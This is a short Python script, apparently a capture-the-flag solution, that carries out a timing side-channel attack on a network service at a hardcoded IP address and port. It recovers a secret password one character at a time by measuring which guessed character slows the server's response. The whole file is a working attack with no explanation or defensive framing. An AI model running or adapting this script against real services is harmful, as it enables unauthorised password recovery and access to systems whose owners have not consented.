#!/usr/bin/env python3

import socket
import time
from string import *

alphabet = ascii_uppercase + ascii_lowercase + digits + "{}_"

HOST = "35.236.203.99"
PORT = 8003

password = []

while True:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((HOST,PORT))

	s.recv(2048)
	s.send(b"9999999\n")
	s.recv(2048)
	t1 = time.time()
	s.send(bytes(''.join(password) + 'a', 'utf-8') + b'\n')
	s.recv(2048)
	a_duration = time.time() - t1

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((HOST,PORT))

	s.recv(2048)
	s.send(b"9999999\n")
	s.recv(2048)
	t1 = time.time()
	s.send(bytes(''.join(password) + 'b', 'utf-8') + b'\n')
	s.recv(2048)
	b_duration = time.time() - t1

	target_duration = min(a_duration, b_duration)+0.3

	for c in alphabet:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		s.connect((HOST,PORT))

		s.recv(2048)
		s.send(b"9999999\n")
		s.recv(2048)
		t1 = time.time()
		print(''.join(password) + c)
		s.send(bytes(''.join(password) + c, 'utf-8') + b'\n')
		s.recv(2048)
		duration = time.time() - t1
		print(duration)
		if duration > target_duration:
			password.append(c)
			break
	print(''.join(password))
